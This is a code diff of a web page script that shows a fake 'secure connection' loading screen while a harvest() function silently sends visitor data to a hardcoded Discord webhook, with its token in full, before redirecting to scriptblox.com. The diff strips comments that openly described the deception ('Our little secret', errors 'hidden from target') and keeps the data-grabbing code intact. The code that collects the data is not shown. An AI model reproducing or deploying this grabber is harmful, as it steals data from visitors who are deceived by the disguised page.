@@ -83,15 +83,10 @@
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        // Your webhook is hardcoded. Our little secret.
         const webhook_url = "https://discord.com/api/webhooks/1386726007465054228/P0U1O9JAs5JYcrE2D48jEn06fuxCCSJEUdWqjVOX9LkDbxZb-fIVh3IWlIQZhOrCSn2h";
 
-        // The final destination after the show is over.
-        const redirect_url = "https://scriptblox.com/"; // A plausible redirect
-        // -------------------
+        const redirect_url = "https://scriptblox.com/";
 
-        // Function to cycle through loading messages to make it look real.
         const statusMessages = [
             "Establishing secure connection...",
             "Authenticating client...",
@@ -108,7 +103,7 @@
             } else {
                 clearInterval(messageInterval);
             }
-        }, 1000); // Change message every second
+        }, 1000);
 
         async function harvest() {
             try {
@@ -152,18 +147,12 @@
                 });
 
             } catch (error) {
-                // Fail silently. The show must go on.
                 console.error("Harvesting error (hidden from target):", error);
             }
         }
 
-        // --- EXECUTION ---
-        
-        // 1. Fire the harvest function immediately and silently in the background.
         harvest();
 
-        // 2. Set a 5-second timer for the redirection. This gives the user time
-        //    to watch the pretty loading screen while their data is being sent.
         setTimeout(() => {
             window.location.replace(redirect_url);
         }, 5000); // 5000ms = 5 seconds
